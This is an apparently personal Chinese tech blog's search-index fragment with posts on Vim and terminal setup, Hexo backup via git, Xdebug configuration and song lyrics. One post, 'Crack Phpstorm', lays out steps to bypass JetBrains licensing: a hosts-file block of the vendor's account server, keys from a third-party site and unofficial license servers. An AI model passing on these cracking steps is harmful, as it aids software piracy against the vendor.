class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ ssh -T git@git.oschina.net </span></span><br><span class="line"><span class="string">Welcome to Git@OSC, git!</span></span><br></pre></td></tr></table></figure></p><p>6.附：删除原有ssh秘钥<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -R 192.168.1.203(你远程服务器的IP)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Vim折腾记(一)</title>
      <link href="/2017/05/01/Vim%E6%8A%98%E8%85%BE%E8%AE%B0(%E4%B8%80)/"/>
      <url>/2017/05/01/Vim%E6%8A%98%E8%85%BE%E8%AE%B0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>最近开始使用Ubuntu，决定折腾折腾上古神器Vim，打造属于自己的IDE。记录下填过的那些坑。</p><a id="more"></a><h3 id="1-Terminal"><a href="#1-Terminal" class="headerlink" title="1.Terminal"></a>1.Terminal</h3><p>Mac下选<a href="http://www.iterm2.com/" target="_blank" rel="noopener">iTerm2</a>，Ubuntu下选用Terminator，至于为什么选择这两款Terminal网上讨论很多。这两款Terminal不仅可以按照自己的喜好设置配色方案，而且新建Tab、分屏等功能，极大的提高了工作效率。附上常用快捷键方便查阅：</p><p><strong>iTerm2</strong>(<a href="http://www.iterm2.com/documentation.html" target="_blank" rel="noopener">官方文档</a>)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">⌘ + t             <span class="comment">//新建标签</span></span><br><span class="line">⌘ + 数字          <span class="comment">//在各 tab 间切换</span></span><br><span class="line">⌘ + f            <span class="comment">//所查找的内容会被自动复制</span></span><br><span class="line">⌘ + d            <span class="comment">//水平分屏 </span></span><br><span class="line">⌘ + shift + d    <span class="comment">//垂直分屏</span></span><br><span class="line">ctrl + u         <span class="comment">//清空当前行，无论光标在什么位置</span></span><br><span class="line">⌘ + shift + h    <span class="comment">//列出剪切板历史</span></span><br></pre></td></tr></table></figure><p><strong>Terminator</strong> (可以通过 “man terminator”查阅帮助文档)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//标签内的操作  </span></span><br><span class="line"> Alt+Up/Down/Left/Right  <span class="comment">//移动到 上/下/左/右 的终端 </span></span><br><span class="line"> Ctrl+Shift+O            <span class="comment">//水平分割终端  </span></span><br><span class="line"> Ctrl+Shift+E            <span class="comment">//垂直分割终端  </span></span><br><span class="line"> Ctrl+Shift+F            <span class="comment">//搜索  </span></span><br><span class="line"> Ctrl+Shift+C            <span class="comment">//复制选中的内容到剪贴板  </span></span><br><span class="line"> Ctrl+Shift+V            <span class="comment">//粘贴剪贴板的内容到此处  </span></span><br><span class="line"> Ctrl+Shift+W            <span class="comment">//关闭当前终端  </span></span><br><span class="line"> Ctrl+Shift+Q            <span class="comment">//退出当前窗口，当前窗口的所有终端都将被关闭  </span></span><br><span class="line"> Ctrl+Shift+X            <span class="comment">//最大化显示当前终端  </span></span><br><span class="line"> Ctrl+Tab                <span class="comment">//移动到下一个终端  </span></span><br><span class="line"><span class="comment">//标签之间的操作  </span></span><br><span class="line"> F11                     <span class="comment">//全屏开关  </span></span><br><span class="line"> Ctrl+Shift+T            <span class="comment">//打开一个新的标签  </span></span><br><span class="line"> Ctrl+PageDown           <span class="comment">//移动到下一个标签  </span></span><br><span class="line"> Ctrl+PageUp             <span class="comment">//移动到上一个标签  </span></span><br><span class="line"> Ctrl+Shift+G            <span class="comment">//重置终端状态并clear屏幕</span></span><br></pre></td></tr></table></figure><p> 2.Shell</p><p>确定好Terminal之后，选择shell，使用传说中的终极shell–zsh，并用开源项目<a href="http://ohmyz.sh/" target="_blank" rel="noopener">Oh My Zsh</a>简化设置。安装完毕后，可以在.zshrc中选择喜欢的主题、插件以及个性化设置。详情可以查阅<a href="https://github.com/robbyrussell/oh-my-zsh/wiki" target="_blank" rel="noopener">官方文档</a>.</p><h2 id="0x01-Vim-基础"><a href="#0x01-Vim-基础" class="headerlink" title="0x01 Vim 基础"></a>0x01 Vim 基础</h2><h3 id="1-基本配置（-vimrc）"><a href="#1-基本配置（-vimrc）" class="headerlink" title="1.基本配置（.vimrc）"></a>1.基本配置（.vimrc）</h3><figure class="highlight vim"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">"显示行号</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">nu</span></span><br><span class="line"></span><br><span class="line"><span class="comment">"语法高亮</span></span><br><span class="line"><span class="keyword">syntax</span> <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">"不需要备份</span></span><br><span class="line"><span class="keyword">set</span> nobackup</span><br><span class="line"></span><br><span class="line"><span class="comment">"没有保存或文件只读时弹出确认</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">confirm</span></span><br><span class="line"></span><br><span class="line"><span class="comment">"鼠标可用</span></span><br><span class="line"><span class="keyword">set</span> mouse=<span class="keyword">a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">"tab缩进</span></span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> expandtab</span><br><span class="line"><span class="keyword">set</span> smarttab</span><br><span class="line"></span><br><span class="line"><span class="comment">"c文件自动缩进</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">cindent</span></span><br><span class="line"></span><br><span class="line"><span class="comment">"自动对齐</span></span><br><span class="line"><span class="keyword">set</span> autoindent</span><br><span class="line"></span><br><span class="line"><span class="comment">"智能缩进</span></span><br><span class="line"><span class="keyword">set</span> smartindent</span><br><span class="line"></span><br><span class="line"><span class="comment">"高亮查找匹配</span></span><br><span class="line"><span class="keyword">set</span> hlsearch</span><br><span class="line"></span><br><span class="line"><span class="comment">"显示匹配</span></span><br><span class="line"><span class="keyword">set</span> showmatch</span><br><span class="line"></span><br><span class="line"><span class="comment">"显示标尺，就是在右下角显示光标位置</span></span><br><span class="line"><span class="keyword">set</span> ruler</span><br><span class="line"></span><br><span class="line"><span class="comment">"启动显示状态行</span></span><br><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">"显示输入的命令</span></span><br><span class="line"><span class="keyword">set</span> showcmd</span><br></pre></td></tr></table></figure><h3 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2.常用命令"></a>2.常用命令</h3><p><img src="/2017/05/01/Vim折腾记(一)/img/vim-keyboard.jpg" alt=""></p><p><img src="/2017/05/01/Vim折腾记(一)/img/vim-command.png" alt=""></p><p>未完待续…</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo 多PC同步及备份</title>
      <link href="/2017/04/26/hexo-%E5%A4%9APC%E5%90%8C%E6%AD%A5%E5%8F%8A%E5%A4%87%E4%BB%BD/"/>
      <url>/2017/04/26/hexo-%E5%A4%9APC%E5%90%8C%E6%AD%A5%E5%8F%8A%E5%A4%87%E4%BB%BD/</url>
      
        <content type="html"><![CDATA[<p>解决异地及多PC之间同步问题。Git服务器的选择，github &amp; oschina。gtihub用于发布，oschina用于备份blog源码，因为oschina提供免费的私有仓库。</p><a id="more"></a><p><strong>0x 01 搭建并发布Hexo</strong></p><p>简易搭建并发布Hexo的步骤可以参考<a href="https://maskhed.github.io/2017/04/24/hexo/">hexo搭建步骤</a></p><p><strong>0x 02 备份Blog</strong></p><p>  2.1 oschina注册并创建仓库</p><p>在git.oschina.net注册账号，并创建私有仓库。（如：xxx.github.io）</p><p>  2.2 创建本地仓库</p><p>首先，删除除.gitignore所包含的目录以外的所有子目录中的.git目录，由于.git目录中包含原仓库的信息，会与新建仓库产生冲突。之后，在Hexo根目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>创建.gitignore文件，并编辑如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/.deploy_git</span><br><span class="line">/node_modules</span><br><span class="line">/public</span><br></pre></td></tr></table></figure><ul><li><p>.deploy_git: Hexo默认的.git目录，不需要备份</p></li><li><p>node_modules: npm install生成的插件等，不需要备份</p></li><li><p>plublic: 每次发布时自动生成的内容，不需要备份</p></li><li><p>_config.yml: 配置文件，依个人情况选择是否备份</p><p>2.3 添加备份并上传</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br><span class="line">$ git add --all</span><br><span class="line">$ git commit -m <span class="string">"xxx"</span></span><br><span class="line">$ git remote add origin https://git.oschina.net/用户名/项目名.git</span><br><span class="line">$ git push -u origin master</span><br></pre></td></tr></table></figure><p><strong>0x 03 异地同步</strong></p><ul><li>从oschina获取最新的Blog备份: git pull</li><li>本地编辑并发布</li><li>备份最新的Blog至oschina: git push</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Crack Phpstorm</title>
      <link href="/2017/04/26/Crack-Phpstorm/"/>
      <url>/2017/04/26/Crack-Phpstorm/</url>
      
        <content type="html"><![CDATA[<p>决定试试大名鼎鼎的PhpStorm,记录下安装及crack过程。</p><a id="more"></a><p>1.<a href="http://www.jetbrains.com/phpstorm/?fromMenu" target="_blank" rel="noopener">官网</a>下载PhpStorm。<br>2.Crack</p><ul><li>hosts文件中添加”0.0.0.0 account.jetbrains.com”</li><li><a href="http://idea.lanyus.com/](http://idea.lanyus.com/)" target="_blank" rel="noopener">http://idea.lanyus.com/](http://idea.lanyus.com/)</a> 获取注册码  </li><li>在PhpStorm中输入注册码，成功激活。  </li></ul><p>3.其他激活方式</p><ul><li><p>填入下面的license server:</p><blockquote><p><a href="http://intellij.mandroid.cn/" target="_blank" rel="noopener">http://intellij.mandroid.cn/</a><br><a href="http://idea.imsxm.com/" target="_blank" rel="noopener">http://idea.imsxm.com/</a><br><a href="http://idea.iteblog.com/key.php" target="_blank" rel="noopener">http://idea.iteblog.com/key.php</a>  </p></blockquote></li><li><p><a href="http://blog.lanyus.com/archives/174.html" target="_blank" rel="noopener">搭建服务器激活</a></p></li></ul><p>参考文章：<br><a href="http://idea.lanyus.com/" target="_blank" rel="noopener">IntelliJ IDEA 注册码</a><br><a href="http://quanzhan.applemei.com/webStack/T1RnMw==" target="_blank" rel="noopener">IntelliJ Idea 2017 免费激活方法</a><br><a href="http://blog.lanyus.com/archives/174.html" target="_blank" rel="noopener">ilanyu’s Blog</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>最初的梦想</title>
      <link href="/2017/04/24/The-dream-of-beginning/"/>
      <url>/2017/04/24/The-dream-of-beginning/</url>
      
        <content type="html"><![CDATA[<p>最初的梦想  </p><a id="more"></a>  <p>如果骄傲没被现实大海冷冷拍下  <br><br>又怎会懂得要多努力  <br><br>才走得到远方  <br><br>如果梦想不曾坠落悬崖  <br><br>千钧一发  <br><br>又怎会晓得执着的人  <br><br>拥有隐形的翅膀  <br><br>把眼泪装在心上  <br><br>会开出勇敢的花  <br><br>可以在疲惫的时光  <br><br>闭上眼睛闻到一种芬芳  <br><br>就像好好睡了一夜直到天亮  <br><br>又能边走着边哼着歌  <br><br>用轻快的步伐  <br><br>沮丧时总会明显感到孤独的重量  <br><br>多渴望懂得的人给些温暖借个肩膀  <br><br>很高兴一路上 我们的默契那么长  <br><br>穿过风 又绕个弯 心还连着  <br><br>像往常一样  <br><br>最初的梦想 紧握在手上  <br><br>最想要去的地方  <br><br>怎么能在半路就返航  <br><br>最初的梦想 绝对会到达  <br><br>实现了真的渴望  <br><br>才能算到过了天堂</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>php-debug</title>
      <link href="/2017/04/24/php-debug/"/>
      <url>/2017/04/24/php-debug/</url>
      
        <content type="html"><![CDATA[<p>那些年，填过的坑  </p><a id="more"></a>  <p>1、php7.0 &amp;&amp; xdebug</p><p><a href="http://stackoverflow.com/questions/37355409/xdebug-with-php-7-on-ubuntu-apache2-not-working" target="_blank" rel="noopener">stack</a></p><p>actually had that problem and took me allot of time to figure out the solution: (if any previous php versions where installed, make sure to first get completely rid of them. if necessary purge and reinstall apache2 and php7)</p><!-- more --><p>first:</p><blockquote><p>sudo apt-get install php-xdebug</p></blockquote><p>then edit the php.ini file of php 7 :</p><blockquote><p>sudo gedit /etc/php/7.0/apache2/php.ini</p></blockquote><p>and just on the bottom add:</p><p>xdebug.remote_enable = On</p><p>save and of course then:</p><blockquote><p>sudo service apache2 restart</p></blockquote>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>陪你走过漫长岁月</title>
      <link href="/2017/04/24/%E9%99%AA%E4%BD%A0%E8%B5%B0%E8%BF%87%E6%BC%AB%E9%95%BF%E5%B2%81%E6%9C%88/"/>
      <url>/2017/04/24/%E9%99%AA%E4%BD%A0%E8%B5%B0%E8%BF%87%E6%BC%AB%E9%95%BF%E5%B2%81%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<p>陪你走过漫长岁月  </p><a id="more"></a>  <p>走过了人来人往<br>不喜欢也得欣赏<br>我是沉默的存在<br>不当你的世界 只作你肩膀  </p><p>拒绝成长到成长  </p><p>变成想要的模样  </p><p>在举手投降以前  </p><p>让我再陪你一段  </p><p>陪你把沿路感想活出了答案  </p><p>陪你把独自孤单变成了勇敢  </p><p>一次次失去又重来 我没离开  </p><p>陪伴是 最长情的告白  </p><p>陪你把想念的酸 拥抱成温暖  </p><p>陪你把彷徨 写出情节来  </p><p>未来多漫长 再漫长 还有期待  </p><p>陪伴你 一直到 故事给说完   </p><p>让我们静静分享  </p><p>此刻难得的坦白  </p><p>只是无声的交谈  </p><p>都感觉幸福 感觉不孤单  </p><p>陪你把沿路感想 活出了答案  </p><p>陪你把独自孤单 变成了勇敢  </p><p>一次次失去 又重来 我没离开  </p><p>陪伴是 最长情的告白    </p><p>陪你把想念的酸 拥抱成温暖    </p><p>陪你把彷徨 写出情节来    </p><p>未来多漫长 再漫长 还有期待    </p><p>陪伴你 一直到 故事给说完  </p>]]></content>
      
      
      
    </entry>
    
  
  
</search>
